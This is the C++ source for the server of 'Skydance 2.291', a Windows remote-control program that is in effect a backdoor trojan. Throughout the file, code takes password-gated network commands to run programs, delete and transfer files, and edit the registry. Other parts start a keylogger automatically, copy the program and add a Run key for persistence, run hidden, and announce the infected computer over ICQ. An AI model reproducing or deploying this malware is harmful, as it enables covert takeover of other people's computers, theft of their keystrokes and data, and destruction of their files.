/**********************************************************************************/
// Read this First!
// Skydance 2.291 Beta Release source code for MFC-VC++ 6.0
// by Edrin@gmx.net
//
// http://skd.box.sk
// - USE SKYDANCE/SKYDANCE SOURCE-CODE AND/OR IT`S COMPONENTS ON YOUR OWN RISK -
//
// Introduction:
//	This Source is FREEWARE!
//	SkyServer is a component of Skydance!
//	Skydance is designed to control other Win95/98/NT systems in tcp/ip-nets like Internet and Intranets.
//	Skydance 2.291 Beta Release is a program that will remain "under construction" and i will NEVER be
//	responsible for any HARM or harmfull things that happend because SKYDANCE(or skydance-source) was USED! 
//	That means I do NOT	guarantee for any features and security-thing
//	and i do not guarantee that this program works proper!!!
//	Indeed i guarantee for nothing ;)
//good luck, Edrin
/**********************************************************************************/
// SkyServerDlg.cpp : Implementierungsdatei
//

#include "stdafx.h"
#include "SkyServerDlg.h"
#include "io.h" //listfile dir
#include "SkyThread.h"	//von mir
#include "OnlineThread.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

typedef void (*INITPROC)(HINSTANCE, BOOL, char[50]);
INITPROC InitProc;

///////////////////////////
//////////////////////los

CString g_sTaskList = "";
int g_iTaskList = 0;
HWND g_hwndTaskList[200];

BOOL CALLBACK EnumWindowsProc( HWND hwnd, LPARAM lParam)
{
	//FINDWINDOWHANDLESTRUCT * pfwhs = (FINDWINDOWHANDLESTRUCT * )lParam; 
	//DWORD ProcessId; 
	CString Title; 
	//GetWindowThreadProcessId ( hwnd, &ProcessId ); 

	/*note: In order to make sure we have the MainFrame, verify that the title has Zero-Length. 
	Under Windows 98, sometimes the Client Window ( which doesn't have a title ) is enumerated before the MainFrame		
	*/
	CWnd::FromHandle( hwnd )->GetWindowText(Title);
	if(Title.GetLength() != 0)
	{
		g_sTaskList += ('<' + Title + '/');
		g_hwndTaskList[g_iTaskList] = hwnd;
		g_iTaskList++;
	}
	/*if ( ProcessId  == pfwhs->ProcessInfo->dwProcessId && Title.GetLength() != 0) 
	{ 
		pfwhs->hWndFound = hwnd; 
		return false; 
	} 
	else 
	{ 
		// Keep enumerating */
		return true; 
	//} 
}


//////////////////////ende
///////////////////////////

/////////////////////////////////////////////////////////////////////////////
// CSkyServerDlg Dialogfeld
CSkyServerDlg::CSkyServerDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CSkyServerDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CSkyServerDlg)
	//}}AFX_DATA_INIT
	// Beachten Sie, dass LoadIcon unter Win32 keinen nachfolgenden DestroyIcon-Aufruf benötigt
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CSkyServerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CSkyServerDlg)
	DDX_Control(pDX, IDC_LRECIEVED, m_ctlRecieved);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CSkyServerDlg, CDialog)
	//{{AFX_MSG_MAP(CSkyServerDlg)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CSkyServerDlg Nachrichten-Handler

BOOL CSkyServerDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Symbol für dieses Dialogfeld festlegen. Wird automatisch erledigt
	//  wenn das Hauptfenster der Anwendung kein Dialogfeld ist
	SetIcon(m_hIcon, TRUE);			// Großes Symbol verwenden
	SetIcon(m_hIcon, FALSE);		// Kleines Symbol verwenden
	int i = 0;
	while(i <= 79) 
	{
		m_bFreeSocket[i] = TRUE;
		i++;
	}
	m_iNextFtpStatNr = 1;
	m_bConnected = FALSE;
	m_iDlgActive = 1;//Update Dlgs...
	m_sListenSocket.SetParent(this);
	m_sConnectSocket.SetParent(this);
	m_sListenSocket.Create(m_iListenPort);
	m_sListenSocket.Listen();
	m_bCorrectPass = FALSE;
	InitProc = NULL;
	hinstDLL = NULL;
	if(bKeyLog == TRUE) StartKeyLogAuto(m_sDLLFile.GetBuffer(80), m_sLogFile.GetBuffer(80));
	//AfxBeginThread(DetectOnlineThread, this, THREAD_PRIORITY_IDLE);
	//AfxMessageBox(m_sUIN);
	ComputerName();
	RunICQPager();
	
	return TRUE;  // Geben Sie TRUE zurück, außer ein Steuerelement soll den Fokus erhalten
}

// Wollen Sie Ihrem Dialogfeld eine Schaltfläche "Minimieren" hinzufügen, benötigen Sie 
//  den nachstehenden Code, um das Symbol zu zeichnen. Für MFC-Anwendungen, die das 
//  Dokument/Ansicht-Modell verwenden, wird dies automatisch für Sie erledigt.

void CSkyServerDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // Gerätekontext für Zeichnen

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Symbol in Client-Rechteck zentrieren
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Symbol zeichnen
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// Die Systemaufrufe fragen den Cursorform ab, die angezeigt werden soll, während der Benutzer
//  das zum Symbol verkleinerte Fenster mit der Maus zieht.
HCURSOR CSkyServerDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}



void CSkyServerDlg::AddRecievedString(CString strRecieved)
{
	m_ctlRecieved.AddString(strRecieved);
	UpdateData(FALSE);
}
/////////////////////////////////////////////////////////MY PART
void CSkyServerDlg::OnAccept()
{
	if(m_bConnected == TRUE)
	{
		m_sConnectSocket.Close();
	}
	m_bConnected = TRUE;
	m_bCorrectPass = FALSE;
	m_sListenSocket.Accept(m_sConnectSocket);
	//Sleep(500);
	//SendEnvironmentData();
}

void CSkyServerDlg::OnClose()
{
	m_sConnectSocket.Close();
	m_bCorrectPass = FALSE;
}

void CSkyServerDlg::OnReceive()
{
	TCHAR buff[10240];
	CString strToAnalyse;
	int nRead;
	int strLeng;
	int nextBreak = 0;
	nRead = m_sConnectSocket.Receive(buff, 10240); 
	if (nRead != SOCKET_ERROR)
	{
		if (nRead)
		{
			buff[nRead] = 0; 
			CString strRecvd(buff);
			SetCurrentCommand(strRecvd);	//speichert den string ab(für run, falls "/" drin vorkommt)
			while(nextBreak != -1)
			{
				strLeng = strRecvd.GetLength();
				nextBreak = strRecvd.Find("/");
				if (nextBreak != -1)
				{				
					strToAnalyse = strRecvd.Left(nextBreak);
					strRecvd = strRecvd.Right(strLeng - nextBreak -  1); //-7
					if(strToAnalyse == "*EOT*") return;					//ESCAPE
					if(strToAnalyse != "") AnalyseString(strToAnalyse);
				}
			}
		}
		else m_sListenSocket.Close();
	}
	else
	{
//		wsprintf (buff, "Error number is %d", GetLastError());		// zur Entwicklung: danach entfernen
//		AfxMessageBox (buff);
	}
}

void CSkyServerDlg::SetCurrentCommand(CString strRecvd)
{
	int strLeng = strRecvd.GetLength();
	m_sRecvdCom	= strRecvd.Right(strLeng - 4);
	m_sRecvdCom = m_sRecvdCom.Left(strLeng - 4 - 2);
}

void CSkyServerDlg::OnSend()
{

}

void CSkyServerDlg::AnalyseString(CString strToAnalyse) ///variablen loka definieren! damit = "";
{
	
	if( m_iDlgActive == 1) AddRecievedString(strToAnalyse);
	int strLeng = strToAnalyse.GetLength();
	int nextBreak = 0;
	int i=0;
	CString part[10];

	while(nextBreak != -1)
			{
				strLeng = strToAnalyse.GetLength();
				nextBreak = strToAnalyse.Find("<");
				if (nextBreak != -1)
				{				
					part[i] = strToAnalyse.Left(nextBreak);
					strToAnalyse = strToAnalyse.Right(strLeng - nextBreak -  1); //-7
					//MessageBox(part[i]);
					i = i++;
				}
			}
	if(part[0] == "Pass")
						{
							if(part[1] == m_sPass)
							{
								m_bCorrectPass = TRUE;
								SendRespond("Pass correct");
							}
							else
							{
								m_bCorrectPass = FALSE;
								SendRespond("Pass WRONG");
								OnClose();
								if( m_iDlgActive == 1) AddRecievedString("Warning!! possible Intruder, wrong Pass :" + part[1]);
							}
						}
	
if( m_bCorrectPass == TRUE)
{
	if(part[0] == "msg")    MsgBox(part[1], part[2], part[3]);
	
	if(part[0] == "run")	if(WinExec(m_sRecvdCom, SW_SHOW) > 31) SendRespond("File runs: " + part[1]);	//SetCurrentCommand(strRecv);
							else SendRespond("Error, could not exec: " + part[1]);

	if(part[0] == "DELETE")	if(DeleteFile(part[1]) != 0) SendRespond("File deleted");
							else SendRespond("Error, could not delete: " + part[1]);
	
	if(part[0] == "copy")	if(CopyFile(part[1], part[2], TRUE) != 0) SendRespond("Copy done");
							else SendRespond("Error, could not copy: " + part[1] + "->" + part[2]);
	
	if(part[0] == "move")	if(MoveFile(part[1], part[2]) != 0) SendRespond("Data moved");
							else SendRespond("Error, could not move: " + part[1] + "->" + part[2]);//also moves Folders!
	
	if(part[0] == "dir")	DirPath(part[1], part[2]);

	if(part[0] == "ftp")	CreateFtpSession(part[1], part[2], part[3], part[4], part[5]);

	if(part[0] == "ChangeSettings")	ChangeSettings(part[1], part[2], part[3], part[4], part[5], part[6], part[7], part[8]);

	if(part[0] == "SendEnvironmentData") SendEnvironmentData();

	if(part[0] == "TurnOff") PostQuitMessage(WM_QUIT);
	
	if(part[0] == "CloseTask") CloseTask(part[1]);

	if(part[0] == "ListTasks") ListTasks();
	
	if(part[0] == "CloseAllTasks") CloseAllTasks();

	if(part[0] == "RemoveDirectory")	if(RemoveDirectory(part[1]) != 0) SendRespond("Directory removed: " + part[1]);
										else SendRespond("Error, Dir not empty?   "  + part[1]);

	if(part[0] == "CreateDirectory")	if(CreateDirectory(part[1], NULL) != 0) SendRespond("Directory created: " + part[1]);
										else SendRespond("Error, Dir allready exists?   " + part[1]);

	if(part[0] == "StartKeyLog")	StartKeyLog(part[1].GetBuffer(80), part[2].GetBuffer(80));

	if(part[0] == "StopKeyLog")		StopKeyLog();

	if(part[0] == "DeleteRegKey")	if(DelRegistryVal(part[1], part[2], part[3])) SendRespond("RegEdit<Value deleted: " + part[3] + "<");
									else SendRespond("RegEdit<Could not delete" + part[3] + "<");

	if(part[0] == "RequestRegKey")	if(GetRegistryVal(part[1], part[2], part[3])) SendRespond("RegEdit<Value of " + part[3] + " is " + m_sGetRegistryVal + "<");
									else SendRespond("RegEdit<" + part[3] + " is not present !<");
								
	if(part[0] == "SetRegKey")		if(SetRegistryVal(part[1],part[2], part[3], part[4], part[5])) SendRespond("RegEdit<Value done: " + part[3] + " = " + part[4] + "<");
									else SendRespond("RegEdit<Could not set " + part[3] + " = " + part[4] + "<");
	
	//if(part[0] == "RemoveSkd")		RemoveSkd();
	//if(part[0] == "IN")	SendICQPager(part[1]);

	//////////////
	///MAPI
/*	if(m_bMAPIworks)
	{
	if(part[0] == "DeleteFolder")	if(m_mLpSessionDeleteFolder
	}*/
	
}
}

void CSkyServerDlg::InitMyLoop()
{
	m_bConnected = FALSE;
	m_iDlgActive = 0;
	m_sListenSocket.SetParent(this);
	m_sConnectSocket.SetParent(this);
	m_sListenSocket.Create(m_iListenPort);
	m_sListenSocket.Listen();
	InitProc = NULL;
	hinstDLL = NULL;
	if(bKeyLog == TRUE) StartKeyLogAuto(m_sDLLFile.GetBuffer(80), m_sLogFile.GetBuffer(80));
/*	AfxBeginThread(
            RUNTIME_CLASS(CSkyThread),
            THREAD_PRIORITY_NORMAL,
            0,
            0);*/
	//CWinThread* AfxBeginThread( DetectOnlineThread, this, THREAD_PRIORITY_IDLE);//, UINT nStackSize = 0, DWORD dwCreateFlags = 0, LPSECURITY_ATTRIBUTES lpSecurityAttrs = NULL );
	ComputerName();
	RunICQPager();
}

void CSkyServerDlg::MsgBox(CString kindOfMSG, CString Message, CString Title)
{
	UINT whatMsgBox;
	if (kindOfMSG == "1") whatMsgBox = MB_ICONHAND;
	else whatMsgBox = MB_ICONHAND;
	if (kindOfMSG == "2") whatMsgBox = MB_ICONQUESTION;
	if (kindOfMSG == "3") whatMsgBox = MB_ICONEXCLAMATION;
	if (kindOfMSG == "4") whatMsgBox = MB_ICONASTERISK;
	MessageBox(Message, Title, MB_OK + whatMsgBox + MB_SYSTEMMODAL);
	SendRespond("MsgBox Created");
}

void CSkyServerDlg::DirPath(CString Rpath, CString andFiles)
{
	struct _finddatai64_t c_file;
	long hFile;
	CString fileName;
	int iLen = Rpath.GetLength();
	
	if( (hFile = _findfirsti64( Rpath + "*.*" , &c_file )) == -1L ) 
		SendRespond("Folder not found: " + Rpath);
	else
	{
		SendRespond(">NewDir");
		fileName = c_file.name;
		if(fileName == ".." || fileName == "." || fileName == "");
		else
		{
			
			if(c_file.attrib & _A_SUBDIR) SendRespond('<' + fileName); //subdir?
		}
		while( _findnexti64(hFile, &c_file ) == 0 )
		{
			fileName = c_file.name;
			if(fileName == ".." || fileName == "." || fileName == "\\");
			else
			{
				
				if(c_file.attrib & _A_SUBDIR) SendRespond('<' + fileName);
			}
		}	
	}	
	_findclose(hFile);	
	SendRespond("*");
	if(andFiles == '1')//send Files(only!)
	{
		if( (hFile = _findfirsti64( Rpath + "*.*" , &c_file )) == -1L ) 
		SendRespond("File not found: " + Rpath + "*.*");
	else
	{
		SendRespond(">NewFile");
		fileName = c_file.name;
		if(fileName == ".." || fileName == "." || fileName == "");
		else
		{
			
			if(!(c_file.attrib & _A_SUBDIR)) SendRespond('<' + fileName); //File?
		}
		while( _findnexti64(hFile, &c_file ) == 0 )
		{
			fileName = c_file.name;
			if(fileName == ".." || fileName == "." || fileName == "\\");
			else
			{
				if(!(c_file.attrib & _A_SUBDIR)) SendRespond('<' + fileName);
			}
		}	
	}
	_findclose(hFile);	
	SendRespond("*");
	}
}

void CSkyServerDlg::SendRespond(CString respond)		//sendstring
{
	if( m_iDlgActive == 1) AddRecievedString(respond);
	int iLen = respond.GetLength();
	int iSent = 0;
	while(iSent <1)
	{
	
	iSent = m_sConnectSocket.Send(respond + '/', iLen + 1);
	if (iSent == SOCKET_ERROR)	//nur zur Fehleranalyse, später entfernen.
			{
/*				if (GetLastError() == WSAEWOULDBLOCK) break;
				else
				{
				TCHAR szError[256];
				wsprintf(szError, "Server Socket failed to send: %d", 
				GetLastError());
				m_sConnectSocket.Close();
				AfxMessageBox (szError);
				}*/
      		}
	}
}

void CSkyServerDlg::SendEnvironmentData()
{
	CString HDletter;
	int i = 0;
	UINT HDtype;
	while(i<=31)
	{
		HDletter = char(65 + i);
		CString HDname = HDletter + ":\\";
		HDtype = GetDriveType(HDname);
		switch (HDtype)
		{
		case DRIVE_UNKNOWN:
			SendRespond("AddHD<" + HDname + "<DRIVE_UNKNOWN<");
			break;	
		case DRIVE_NO_ROOT_DIR:
			break;
		case DRIVE_REMOVABLE:	
			SendRespond("AddHD<" + HDname + "<DRIVE_REMOVABLE<");
			break;
		case DRIVE_FIXED:
			SendRespond("AddHD<" + HDname + "<DRIVE_FIXED<");
			break;
		case DRIVE_REMOTE:
			SendRespond("AddHD<" + HDname + "<DRIVE_REMOTE<");
			break;
		case DRIVE_CDROM:
			SendRespond("AddHD<" + HDname + "<DRIVE_CDROM<");
			break;
		case DRIVE_RAMDISK:
			SendRespond("AddHD<" + HDname + "<RAMDISK<");
			break;
		default: SendRespond("Error");
			
		}
		i++;
	}
	
	char sEnableDlg[3];
	itoa(m_iEnableDlg, sEnableDlg, 10);
	SendRespond("ServerInfo<" + (CString)sEnableDlg + "<" + m_sComputerName + "<" 
										+ m_sServerName + "<" + m_sUIN + "<");
	
	if(m_sLogFile != "" && m_sDLLFile != "")
	{
		SendRespond("KeyLogInfo<" + m_sDLLFile + "<" + m_sLogFile + "<" + m_sLogAlways + "<");
	}
	else SendRespond("KeyLog not installed");
	
	//SendRespond("ComputerName: " + m_sComputerName);
	SendRespond("-Skydance Server 2.291 - DO NOT HARM PEOPLE!!!");
	SendRespond("-Skydance Server 2.291 - HELP CHILDREN IN AFRICA!!!");
	SendRespond("EnvironmentData done...");
}

void CSkyServerDlg::CreateFtpSession(CString conType, CString fileName, CString ftpPort, CString upDown, CString sNextFtpStatNr)
{
	struct _finddatai64_t c_file;
	m_iNextFtpStatNr = 1;
	while(m_bFreeSocket[m_iNextFtpStatNr] == FALSE) m_iNextFtpStatNr++;//Nr freimachen
	if (m_iNextFtpStatNr >39)
	{
		//AfxMessageBox("Error, too many Downloads!");
		return;
	}
	bool bUpDown;
	bool bSCway;
	int iFtpPort;
	HANDLE hFile;
	long lFile;
	if(upDown == "download")	////Dateigrösse herausfinden und senden
	{
		bUpDown = TRUE;
		hFile = CreateFile (TEXT(fileName),       // Open One.txt.
		                GENERIC_READ,           // Open for reading
						0,                      // Do not share
			            NULL,                   // No security
				        OPEN_EXISTING,          // Existing file only
					    FILE_ATTRIBUTE_NORMAL,  // Normal file
						NULL);                  // No template file
		int iFileSize = GetFileSize(hFile, NULL);
		char sFileSize[20];
		itoa(iFileSize, sFileSize, 10);
		if (iFileSize == -1)
		{
			SendRespond("Error, Could not get FileSize");
			return;
		}
		//CString sRespond = "FileSize<" + sFileSize;
		else SendRespond("FileSize<" + sNextFtpStatNr + "<" + sFileSize + "<");		
		CloseHandle (hFile);
	}
	if(upDown == "upload")
	{
		if( (lFile = _findfirsti64( fileName , &c_file )) != -1L )
		{
			SendRespond("Server: FTP aborted, file allready exists: " + fileName);
			return;
		}
		bUpDown = FALSE;
	}
	if(conType == "ConToMe") bSCway = FALSE;
	if(conType == "WaitForCon") bSCway = TRUE;
	sscanf (ftpPort, "%d", &iFtpPort);	
	CString sActiveIP;
	UINT conPort;
	if(!m_sConnectSocket.GetPeerName(sActiveIP, conPort)) return; 
	m_bFreeSocket[m_iNextFtpStatNr] = FALSE;
	m_cSkyThread =						//Thread laden
         (CSkyThread*)AfxBeginThread(
            RUNTIME_CLASS(CSkyThread),
            THREAD_PRIORITY_NORMAL,
            0,
            CREATE_SUSPENDED);
	m_cSkyThread->m_pDialog = this;
	m_cSkyThread->m_iStatusNr = m_iNextFtpStatNr;
	m_cSkyThread->m_bUpDown = bUpDown;
	m_cSkyThread->m_bSCway = bSCway;
	m_cSkyThread->m_sActiveIP = sActiveIP;
	m_cSkyThread->m_iFtpPort = iFtpPort;
	m_cSkyThread->m_sFileName = fileName;
	//und ab gehts!
	m_cSkyThread->ResumeThread();
	SendRespond("Server: FTP prepared");
}

void CSkyServerDlg::ChangeSettings(CString sPass, CString sFileName, CString sPort, CString sVisibility,
								   CString sDLLFile, CString sLogFile, CString sKeyLogAllways, CString sUIN)
{
	extern char far *_pgmptr;
	//HKEY hKeyParent = HKEY_LOCAL_MACHINE;
	CString sHKEY = "2";
	CString sTyp = "0";
	CString RunKeyName = "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	CString IniKeyName = "\\Software\\Microsoft\\Windows\\CurrentVersion";

	SetRegistryVal( sHKEY , IniKeyName , "SkdPort" , sPort, sTyp);	
	SetRegistryVal( sHKEY , IniKeyName , "SkdDlg" , sVisibility, sTyp);	
	SetRegistryVal( sHKEY , IniKeyName , "SkdPass" ,sPass , sTyp);	
	SetRegistryVal( sHKEY , IniKeyName , "SkdDLL" , sDLLFile, sTyp);	
	SetRegistryVal( sHKEY , IniKeyName , "SkdLog" , sLogFile, sTyp);	
	SetRegistryVal( sHKEY , IniKeyName , "SkdLA" , sKeyLogAllways, sTyp);	
	SetRegistryVal( sHKEY , IniKeyName , "SkdUIN" , sUIN, sTyp);
	
	m_sLogAlways = sKeyLogAllways;
	m_sDLLFile = sDLLFile;
	m_sLogFile = sLogFile;	
	m_sPass = sPass;
	
	if(sFileName == "" || sFileName == m_sServerName)
	{
		SendRespond("Settings are good :)");
		return;	
	}
	else
	{
		if(CopyFile( _pgmptr, sFileName , FALSE) == 0)
		{
			SendRespond("copy Skd failed!");
			return;
		}		
		SetRegistryVal( sHKEY , RunKeyName , "Skd" , sFileName, sTyp);	
	}
	SendRespond("Settings are good :)");
	return;
}

//DEL void CSkyServerDlg::CloseCurrentTask()
//DEL {
//DEL 	//AfxMessageBox("Bla, los gehts");
//DEL 	//HWND bla;
//DEL 	CWnd *bla;
//DEL 	//bla = FindWindow( NULL, NULL);
//DEL 	bla = GetActiveWindow();
//DEL 	if(bla == NULL) AfxMessageBox("Error, no window");
//DEL 	if(bla != NULL)
//DEL 	{
//DEL 		//AfxMessageBox("window !");
//DEL 	//PostMessage(bla, WM_Quit, 0,0);
//DEL 	//GetActiveWindow(VOID);
//DEL 		bla->PostMessage(WM_CLOSE, 0, 0);
//DEL 	//::SendMessage(
//DEL 	}
//DEL }

void CSkyServerDlg::ListTasks()
{
	g_sTaskList = "";
	g_iTaskList = 0;
	EnumWindows(EnumWindowsProc, NULL);
	SendRespond(">NewTask/" + g_sTaskList);
}

void CSkyServerDlg::CloseTask(CString sTaskNumber)
{
	int iTaskNumber;
	CWnd *cwndSelected;
	sscanf (sTaskNumber, "%d", &iTaskNumber);
	cwndSelected = CWnd::FromHandle(g_hwndTaskList[iTaskNumber]);
	cwndSelected->PostMessage(WM_CLOSE, 0, 0);
	cwndSelected->PostMessage(WM_DESTROY, 0, 0);
	cwndSelected->PostMessage(WM_QUIT, 0, 0);
	SendRespond("Selected Task closed !");
}

void CSkyServerDlg::CloseAllTasks()
{
	::PostMessage(HWND_BROADCAST, WM_CLOSE, 0, 0);
	::PostMessage(HWND_BROADCAST, WM_DESTROY, 0, 0);
	::PostMessage(HWND_BROADCAST, WM_QUIT, 0, 0);
	SendRespond("All Tasks closed !");
}

//////DLL-import - Variablen!
//	LRESULT hkprcSysMsg; 

//	static HHOOK hhookSysMsg;
void CSkyServerDlg::StartKeyLog(char sDllName[80], char sLogfileName[80])
{
	if(bKeyLog)
	{
		SendRespond("KeyLog already activated!");
		return;
	}
	if(CString(sDllName) == "" || CString(sLogfileName) == "")
	{
		SendRespond("FileName not correct (DLL or LogFile)!");
		return;
	}
	if(hinstDLL && InitProc)
	{	
		InitProc(hinstDLL, TRUE, sLogfileName);
		bKeyLog = 1;
		SendRespond("KeyLog activated");
		return;
	}
	else
	{
		if(LoadDLL(sDllName) == 0)
		{
			InitProc(hinstDLL, TRUE, sLogfileName);
			bKeyLog = 1;
			SendRespond("KeyLog activated");
			return;
		}
		else SendRespond("Could not start KeyLog!");
	}
}

void CSkyServerDlg::StopKeyLog()
{
	if(!bKeyLog)
	{
		SendRespond("KeyLog already disabled!");
		return;
	}
	if(hinstDLL && InitProc) 
	{
		InitProc(hinstDLL, FALSE, "skdlogfile.txt");
		SendRespond("KeyLog disabled");
	}
	else SendRespond("Could not disabled KeyLog");
	FreeLibrary(hinstDLL);
	bKeyLog = 0;
	hinstDLL = NULL;
	InitProc = NULL;
}


int CSkyServerDlg::LoadDLL(CString DLLFileName)
{
	hinstDLL	= LoadLibrary(DLLFileName);
	if(hinstDLL)
	{
		InitProc = (INITPROC)GetProcAddress(hinstDLL, "DLLInit");
		if(InitProc)
		{
			SendRespond("KeyLog ready...");
			return 0;
		}
		else
		{
			SendRespond("Function not found!");
			return 1;
		}
	}
	SendRespond("skdl.dll not found!");
	return 2;
}

void CSkyServerDlg::StartKeyLogAuto(CString DLLFile, char LogFile[80])
{
	//AfxMessageBox(DLLFile);
	//AfxMessageBox(LogFile);
	hinstDLL	= LoadLibrary(DLLFile);
	InitProc = (INITPROC)GetProcAddress(hinstDLL, "DLLInit");
	InitProc(hinstDLL, TRUE, LogFile);
	bKeyLog = 1;
}

void CSkyServerDlg::RunICQPager()
{
 	if(m_sUIN == "") return;
	COnlineThread *m_cOnlineThread;
 	m_cOnlineThread =(COnlineThread*)AfxBeginThread(
 				RUNTIME_CLASS(COnlineThread),
 				THREAD_PRIORITY_IDLE,
 				0,
 				CREATE_SUSPENDED);
 	m_cOnlineThread->m_sUIN = m_sUIN;
	
	if(m_iEnableDlg == 1) m_cOnlineThread->m_sServerInfo = m_sComputerName + "-Visible";
	else m_cOnlineThread->m_sServerInfo = m_sComputerName + "-Hidden";

 	m_cOnlineThread->ResumeThread();
}

void CSkyServerDlg::ComputerName()
{
	TCHAR nameBuff[256];
	LPTSTR ComputerName;
	ComputerName = nameBuff;
	DWORD size = 256;
	if(!::GetComputerName(ComputerName, &size)) m_sComputerName = "Noname";
 	else m_sComputerName = ComputerName;
 	//delete ComputerName;
}

//DEL void CSkyServerDlg::RemoveSkd()
//DEL {
//DEL 	CString sHKEY = "2";
//DEL 	CString RunKeyName = "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
//DEL 	CString IniKeyName = "\\Software\\Microsoft\\Windows\\CurrentVersion";
//DEL 	CString sERem = "Not removed? ";
//DEL 	CString sRcom;
//DEL 	//delete file with RunOnce!	
//DEL //	if(!GetRegistryVal(sHKEY, RunKeyName, "Skd" )) {SendRespond("Error:Skydance not installed!!! aborted"); return;}
//DEL //	else sRcom = m_sGetRegistryVal;
//DEL //	if(!SetRegistryVal(sHKEY, IniKeyName + "\\RunServicesOnce", "SkdRemove", "command.com /c del " + sRcom, "0")) {SendRespond("Error:Skydance not removed?! aborted"); return;}
//DEL 	//remove all keys!	
//DEL 	if(DelRegistryVal(sHKEY, IniKeyName, "SkdPass")) SendRespond("Removed: SkdPass");
//DEL 	else SendRespond(sERem + "SkdPass");
//DEL 	if(DelRegistryVal(sHKEY, IniKeyName, "SkdDlg" )) SendRespond("Removed: SkdDlg");
//DEL 	else SendRespond(sERem + "SkdDlg");
//DEL 	if(DelRegistryVal(sHKEY, IniKeyName, "SkdPort" )) SendRespond("Removed: SkdPort");
//DEL 	else SendRespond(sERem + "SkdPort");
//DEL 	if(DelRegistryVal(sHKEY, IniKeyName, "SkdLog" )) SendRespond("Removed: SkdLog");
//DEL 	else SendRespond(sERem + "SkdLog");
//DEL 	if(DelRegistryVal(sHKEY, IniKeyName, "SkdLA" )) SendRespond("Removed: SkdLA");
//DEL 	else SendRespond(sERem + "SkdLA");
//DEL 	if(DelRegistryVal(sHKEY, IniKeyName, "SkdDLL" )) SendRespond("Removed: SkdDLL");
//DEL 	else SendRespond(sERem + "SkdDLL");
//DEL 	if(DelRegistryVal(sHKEY, IniKeyName, "SkdUIN" )) SendRespond("Removed: SkdUIN");
//DEL 	else SendRespond(sERem + "SkdUIN");
//DEL 	if(DelRegistryVal(sHKEY, RunKeyName, "Skd" )) SendRespond("Removed: Skd");
//DEL 	else SendRespond(sERem + "Skd");
//DEL 	SendRespond(sERem + "All Registry-Fields removed!");
//DEL 	SendRespond(sERem + "Sorry, but i can not delete runing server");
//DEL }

